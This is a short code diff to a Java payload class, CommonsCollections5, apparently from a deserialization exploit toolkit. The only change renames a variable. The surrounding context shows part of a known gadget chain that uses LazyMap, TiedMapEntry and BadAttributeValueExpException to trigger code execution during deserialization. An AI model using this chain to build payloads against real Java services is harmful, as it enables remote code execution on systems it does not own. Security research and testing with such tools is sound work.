@@ -47,9 +47,9 @@ public class CommonsCollections5 implements ObjectPayload<Object> {
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, "x");
 
-        Object val = KickOff.badAttributeValueExpException(entry);
+        Object badAttributeValueExpException = KickOff.badAttributeValueExpException(entry);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
-        return val;
+        return badAttributeValueExpException;
     }
 }
